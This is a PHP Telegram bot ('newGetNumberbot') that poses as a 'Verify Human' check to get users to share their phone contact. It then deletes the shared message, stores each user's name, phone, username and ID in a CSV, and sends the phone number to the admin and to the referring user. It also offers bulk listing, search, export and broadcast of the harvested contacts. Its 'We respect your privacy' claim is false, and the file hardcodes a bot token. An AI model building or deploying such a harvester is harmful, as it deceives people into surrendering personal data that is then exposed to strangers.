<?php
/**
 * newGetNumberbot.php
 * Single-file PHP polling Telegram bot converted from the provided Node.js bot.
 *
 * Usage: php newGetNumberbot.php
 *
 * Requirements:
 *  - PHP CLI
 *  - PHP cURL extension enabled
 *
 * Notes:
 *  - Polling implementation (getUpdates) with offset handling.
 *  - contacts.csv used for persisting contacts.
 *  - referrals.json used to persist referral mappings.
 *  - Basic error handling and logging to stdout.
 *
 */

// ----------------------------- CONFIG -------------------------------------
const BOT_TOKEN = '8332737651:AAGifKj51tf87P1Hcp-UsyjS4tSJMyVhWcc';
const ADMIN_ID = 7115841620;
const CONTACT_FILE = __DIR__ . '/contacts.csv';
const REFERRAL_FILE = __DIR__ . '/referrals.json';
const API_BASE = 'https://api.telegram.org/bot' . BOT_TOKEN . '/';
// --------------------------------------------------------------------------

// Ensure environment
date_default_timezone_set('Asia/Kolkata');
set_time_limit(0);
ini_set('display_errors', 1);
error_reporting(E_ALL);

// ---------------------------- Utilities -----------------------------------

function tg_request($method, $params = []) {
    $url = API_BASE . $method;
    $ch = curl_init($url);

    $isFile = false;
    foreach ($params as $k => $v) {
        if ($v instanceof CURLFile) { $isFile = true; break; }
    }

    if ($isFile) {
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    } else {
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($params));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    }

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);

    $result = curl_exec($ch);
    if ($result === false) {
        $err = curl_error($ch);
        curl_close($ch);
        echo "[tg_request error] $err\n";
        return null;
    }
    curl_close($ch);
    $decoded = json_decode($result, true);
    return $decoded;
}

function tg_getUpdates($offset = null, $timeout = 30) {
    $params = ['timeout' => $timeout, 'limit' => 50];
    if ($offset !== null) $params['offset'] = $offset;
    return tg_request('getUpdates', $params);
}

function tg_sendMessage($chat_id, $text, $extra = []) {
    $params = array_merge(['chat_id' => $chat_id, 'text' => $text], $extra);
    return tg_request('sendMessage', $params);
}

function tg_deleteMessage($chat_id, $message_id) {
    return tg_request('deleteMessage', ['chat_id' => $chat_id, 'message_id' => $message_id]);
}

function tg_getMe() {
    return tg_request('getMe', []);
}

// ------------------------- Persistence helpers ----------------------------

function ensureContactFile() {
    if (!file_exists(CONTACT_FILE)) {
        $header = ['Name','Phone','Username','Chat ID','Day','Time','Referrer ID'];
        file_put_contents(CONTACT_FILE, implode(',', $header) . PHP_EOL);
    }
}

function loadContacts() {
    $rows = [];
    if (!file_exists(CONTACT_FILE)) return $rows;
    $handle = fopen(CONTACT_FILE, 'r');
    if (!$handle) return $rows;
    $header = fgetcsv($handle);
    if ($header === false) { fclose($handle); return $rows; }
    while (($data = fgetcsv($handle)) !== false) {
        $row = [];
        foreach ($header as $i => $col) {
            $row[$col] = isset($data[$i]) ? $data[$i] : '';
        }
        $rows[] = $row;
    }
    fclose($handle);
    return $rows;
}

function contactExists($chatId) {
    static $cache = null;
    if ($cache === null) $cache = loadContacts();
    foreach ($cache as $r) {
        if (strval($r['Chat ID']) === strval($chatId)) return true;
    }
    return false;
}

function appendContact($obj) {
    ensureContactFile();
    $row = [
        $obj['name'],
        $obj['phone'],
        $obj['username'],
        $obj['chatId'],
        $obj['day'],
        $obj['time'],
        $obj['referrer'] ?? 'None'
    ];
    $out = fopen(CONTACT_FILE, 'a');
    if ($out) {
        fputcsv($out, $row);
        fclose($out);
        // clear cached contacts so future reads get latest
        if (function_exists('apcu_delete')) { @apcu_delete('contacts_cache'); }
        return true;
    }
    return false;
}

// Referral persistence
function loadReferrals() {
    if (!file_exists(REFERRAL_FILE)) return [];
    $json = @file_get_contents(REFERRAL_FILE);
    if (!$json) return [];
    $data = json_decode($json, true);
    return is_array($data) ? $data : [];
}

function saveReferrals($map) {
    file_put_contents(REFERRAL_FILE, json_encode($map, JSON_PRETTY_PRINT));
}

// --------------------------- Initialization -------------------------------

ensureContactFile();
$contactLogs = loadContacts();
$referralLinks = loadReferrals();

echo "✨ Contact Saver Bot (PHP) Running...\n";
echo "Bot token: " . substr(BOT_TOKEN,0,6) . "*****\n";
echo "Admin ID: " . ADMIN_ID . "\n\n";

// Fetch bot username for generating referral links
$me = tg_getMe();
$botUsername = $me['result']['username'] ?? null;
if (!$botUsername) {
    echo "Warning: Could not fetch bot username via getMe(). Referral links will use 'YourBot'.\n";
    $botUsername = 'YourBot';
}

// Broadcast mode flag and temporary state (in-memory)
$isBroadcastMode = false;
$broadcastInitiator = null;
$checkDetailsHandlerActive = false;
$checkDetailsInitiator = null;

// ---------------------------- Main loop ----------------------------------
$update_offset = null;

while (true) {
    $resp = tg_getUpdates($update_offset, 30);
    if (!$resp || !isset($resp['ok'])) {
        // network issue — wait and retry
        sleep(3);
        continue;
    }
    foreach ($resp['result'] as $update) {
        $update_offset = ($update['update_id'] ?? 0) + 1;

        // choose whether it's message, edited_message, callback_query etc.
        $message = $update['message'] ?? $update['edited_message'] ?? null;
        $callback = $update['callback_query'] ?? null;

        // handle callback_query if needed (not present in original JS)
        if ($callback) {
            // skip for now
            continue;
        }

        if (!$message) continue;

        $chatId = $message['chat']['id'] ?? null;
        $from = $message['from'] ?? [];
        $fromId = $from['id'] ?? null;
        $text = $message['text'] ?? '';
        $contact = $message['contact'] ?? null;

        // Admin broadcast mode: if active and message from admin -> treat as broadcast content
        global $isBroadcastMode, $broadcastInitiator, $checkDetailsHandlerActive, $checkDetailsInitiator;
        // NOTE: we're using global variables above; but inside loop we access local
        // We'll implement broadcast/check handlers using simple flags.

        // -------------------- /start handler ---------------------------
        if (preg_match('/^\/start(?:\s+(.+))?/i', $text, $m)) {
            try {
                $arg = isset($m[1]) ? trim($m[1]) : null;
                $refId = null;
                if ($arg && strpos($arg, 'ref_') === 0) {
                    $refId = substr($arg, 4);
                    // store mapping (persist)
                    $referralLinks[strval($fromId)] = strval($refId);
                    saveReferrals($referralLinks);
                }

                if ($fromId == ADMIN_ID) {
                    $keyboard = [
                        'keyboard' => [
                            ['📋 All Contacts'],
                            ['📤 Get Your Link'],
                            ['🔍 Check Details'],
                            ['📢 Broadcast Message'],
                            ['📦 Export CSV']
                        ],
                        'resize_keyboard' => true
                    ];
                    tg_sendMessage($chatId, "👑Welcome Admin G👑", ['reply_markup' => $keyboard]);
                    continue;
                }

                if (contactExists($fromId)) {
                    $keyboard = ['keyboard' => [[['text' => '📤 Get Your Link']]], 'resize_keyboard' => true];
                    tg_sendMessage($chatId, "✅ Aapka already verified hai.", ['reply_markup' => $keyboard]);
                    continue;
                }

                // NEW USER – ASK CONTACT
                $keyboard = [
                    'keyboard' => [[['text' => 'Verify Human✅', 'request_contact' => true]]],
                    'resize_keyboard' => true
                ];

                $textToSend = "👋 *Welcome!* \n\nThis bot is made by danger to help you.\n";
                if ($refId) $textToSend .= "📨 Invite by user ID: `{$refId}`\n\n";
                $textToSend .= "First📱Press *Verify Human✅*\n\nWe respect your privacy";

                tg_sendMessage($chatId, $textToSend, ['parse_mode' => 'Markdown', 'reply_markup' => $keyboard]);
                continue;

            } catch (Exception $e) {
                echo "Error in /start: " . $e->getMessage() . "\n";
            }
        }

        // -------------------- contact handler --------------------------
        if ($contact) {
            try {
                // Try to remove the contact message quickly
                @tg_deleteMessage($chatId, $message['message_id']);

                if (contactExists($fromId)) {
                    $opts = ['reply_markup' => ['keyboard' => [[['text'=>'📤 Get Your Link']]], 'resize_keyboard' => true]];
                    tg_sendMessage($chatId, "ℹ️Already saved.", $opts);
                    continue;
                }

                $dt = new DateTime('now', new DateTimeZone('Asia/Kolkata'));
                $obj = [
                    'name' => $from['first_name'] ?? 'Unknown',
                    'phone' => $contact['phone_number'] ?? '',
                    'username' => isset($from['username']) ? ('@' . $from['username']) : 'Not Available',
                    'chatId' => strval($fromId),
                    'day' => $dt->format('l'),
                    'time' => $dt->format('h:i A'),
                    'referrer' => $referralLinks[strval($fromId)] ?? null
                ];

                appendContact($obj);

                // Confirmation to the new user
                tg_sendMessage($chatId, "✅ Human verification successful!");

                // Notify admin
                $adminText = "📩 *New Contact:*\n" .
                             "👤 TgName:👉" . $obj['name'] . "\n" .
                             "📱 PhoneNo:👉" . $obj['phone'] . "\n" .
                             "🔗 UserName:👉" . $obj['username'] . "\n" .
                             "🆔 UserID:👉" . $obj['chatId'] . "\n" .
                             "📅 {$obj['day']} | 🕒 {$obj['time']}\n" .
                             "👥 Referred by: " . ($obj['referrer'] ? $obj['referrer'] : 'None');

                tg_sendMessage(ADMIN_ID, $adminText, ['parse_mode'=>'Markdown']);

                // Notify referrer if exists and not same as user
                try {
                    if (!empty($obj['referrer']) && strval($obj['referrer']) !== strval($obj['chatId'])) {
                        $refMsg = "🎉 *Someone used your referral link!*\n\n" .
                                  "👤 TgName:👉" . $obj['name'] . "\n" .
                                  "📱 PhoneNo:👉" . $obj['phone'] . "\n" .
                                  "🔗 UserName:👉" . $obj['username'] . "\n" .
                                  "🆔 UserID:👉" . $obj['chatId'] . "\n" .
                                  "♻️ ADMIN:👉@s1danger♻️";
                        tg_sendMessage($obj['referrer'], $refMsg, ['parse_mode'=>'Markdown']);
                    }
                } catch (Exception $e) {
                    echo "Could not notify referrer: " . $e->getMessage() . "\n";
                } finally {
                    // remove mapping to avoid duplicate notifications later
                    if (isset($referralLinks[strval($fromId)])) {
                        unset($referralLinks[strval($fromId)]);
                        saveReferrals($referralLinks);
                    }
                }

                // show invite link button
                $opts = ['reply_markup' => ['keyboard' => [[['text' => '📤 Get Your Link']]], 'resize_keyboard' => true]];
                tg_sendMessage($chatId, "📤 Now you can generate your invite link.", $opts);
                continue;

            } catch (Exception $e) {
                echo "Error handling contact: " . $e->getMessage() . "\n";
            }
        }

        // -------------------- Text commands and buttons --------------------

        // Admin-only commands handling
        if ($fromId == ADMIN_ID && is_string($text)) {

            // 📤 Get Your Link (exact button)
            if (mb_strpos($text, '📤 Get Your Link') !== false || mb_strpos($text, 'Get Your Link') !== false) {
                $link = "https://t.me/{$botUsername}?start=ref_{$fromId}";
                $sent = tg_sendMessage($chatId, "🔗 *Your Referral Link:*\n[{$link}]({$link})\n\n_This message will auto-delete in 30s._", ['parse_mode'=>'Markdown', 'disable_web_page_preview'=>true]);
                // auto-delete after 30s if not admin; for admin we don't delete
                if ($fromId != ADMIN_ID && isset($sent['result']['message_id'])) {
                    // wait 30 sec then delete (blocking)
                    sleep(30);
                    @tg_deleteMessage($chatId, $sent['result']['message_id']);
                }
                continue;
            }

            // 📋 All Contacts
            if (mb_strpos($text, '📋 All Contacts') !== false) {
                $rows = loadContacts();
                if (count($rows) === 0) {
                    tg_sendMessage($chatId, "⚠️ No contacts found.");
                    continue;
                }
                $chunks = [];
                $outText = "📋 *Total Contacts:* " . count($rows) . "\n\n";
                foreach ($rows as $i => $r) {
                    $outText .= ($i+1) . ") *" . ($r['Name'] ?? '') . "*\n";
                    $outText .= "📱 " . ($r['Phone'] ?? '') . "\n";
                    $outText .= "🔗 " . ($r['Username'] ?? '') . "\n";
                    $outText .= "🆔 " . ($r['Chat ID'] ?? '') . "\n";
                    $outText .= "📅 " . ($r['Day'] ?? '') . " | " . ($r['Time'] ?? '') . "\n";
                    $outText .= "👥 Ref: " . ($r['Referrer ID'] ?? '') . "\n\n";
                    // send chunks when long to avoid message limits
                    if (mb_strlen($outText) > 3500) {
                        tg_sendMessage($chatId, $outText, ['parse_mode'=>'Markdown']);
                        $outText = '';
                    }
                }
                if ($outText !== '') tg_sendMessage($chatId, $outText, ['parse_mode'=>'Markdown']);
                continue;
            }

            // 📦 Export CSV
            if (mb_strpos($text, '📦 Export CSV') !== false) {
                if (!file_exists(CONTACT_FILE)) {
                    tg_sendMessage(ADMIN_ID, "⚠️ contacts.csv file missing.");
                    continue;
                }
                // send document
                $ch = curl_init(API_BASE . 'sendDocument');
                $post = [
                    'chat_id' => ADMIN_ID,
                    'document' => new CURLFile(realpath(CONTACT_FILE)),
                    'filename' => 'contacts_export.csv'
                ];
                curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $res = curl_exec($ch);
                curl_close($ch);
                tg_sendMessage(ADMIN_ID, "✅ CSV sent.");
                continue;
            }

            // 🔍 Check Details
            if (mb_strpos($text, '🔍 Check Details') !== false) {
                tg_sendMessage(ADMIN_ID, "🆔 Send User ID, username or phone number:");
                // We'll set a simple flag: the next message from admin will be treated as query.
                $checkDetailsHandlerActive = true;
                $checkDetailsInitiator = ADMIN_ID;
                continue;
            }

            // 📢 Broadcast Message
            if (mb_strpos($text, '📢 Broadcast Message') !== false) {
                tg_sendMessage(ADMIN_ID, "📝 Type the broadcast message:");
                $isBroadcastMode = true;
                $broadcastInitiator = ADMIN_ID;
                continue;
            }
        } // end admin check

        // If check details handler active and message from admin (not a command)
        if (!empty($checkDetailsHandlerActive) && $fromId == $checkDetailsInitiator && !empty($text)) {
            $q = trim(str_replace('@','',strtolower($text)));
            $found = false;
            $rows = loadContacts();
            foreach ($rows as $r) {
                $chatMatch = (strval($r['Chat ID']) === $q);
                $phoneMatch = (strpos(strval($r['Phone']), $q) !== false);
                $userMatch = (strpos(strtolower(strval($r['Username'])), $q) !== false);
                if ($chatMatch || $phoneMatch || $userMatch) {
                    $found = true;
                    $reply = "📇 *User Details:*\n👤 " . ($r['Name'] ?? '') . "\n📱 " . ($r['Phone'] ?? '') . "\n🔗 " . ($r['Username'] ?? '') . "\n🆔 " . ($r['Chat ID'] ?? '');
                    tg_sendMessage(ADMIN_ID, $reply, ['parse_mode'=>'Markdown']);
                }
            }
            if (!$found) tg_sendMessage(ADMIN_ID, "❌ No record found.");
            $checkDetailsHandlerActive = false;
            $checkDetailsInitiator = null;
            continue;
        }

        // Broadcast handler
        if (!empty($isBroadcastMode) && $fromId == $broadcastInitiator && !empty($text)) {
            $isBroadcastMode = false;
            $message = $text;
            $rows = loadContacts();
            tg_sendMessage(ADMIN_ID, "📤 Sending broadcast to " . count($rows) . " users...");
            foreach ($rows as $r) {
                try {
                    tg_sendMessage($r['Chat ID'], "📢 *Admin Broadcast:*\n" . $message, ['parse_mode'=>'Markdown']);
                } catch (Exception $e) {
                    // ignore per-user errors
                }
            }
            tg_sendMessage(ADMIN_ID, "✅ Broadcast sent successfully.");
            continue;
        }

        // Non-admin / general user: "📤 Get Your Link" button and others
        if (is_string($text) && (mb_strpos($text, '📤 Get Your Link') !== false || mb_strpos($text, 'Get Your Link') !== false)) {
            $link = "https://t.me/{$botUsername}?start=ref_{$fromId}";
            $sent = tg_sendMessage($chatId, "🔗 *Your Referral Link:*\n[{$link}]({$link})\n\n_This message will auto-delete in 30s._", ['parse_mode'=>'Markdown', 'disable_web_page_preview'=>true]);
            // If user is not admin, auto-delete after 30s (blocking)
            if ($fromId != ADMIN_ID && isset($sent['result']['message_id'])) {
                sleep(30);
                @tg_deleteMessage($chatId, $sent['result']['message_id']);
            }
            continue;
        }

        // If user sent any other text, ignore or respond minimal (mirrors original: only certain handlers used)
        // Here we do nothing, but we can optionally log it.
        // echo "Unhandled message from $fromId : $text\n";
    } // end foreach updates
} // end while
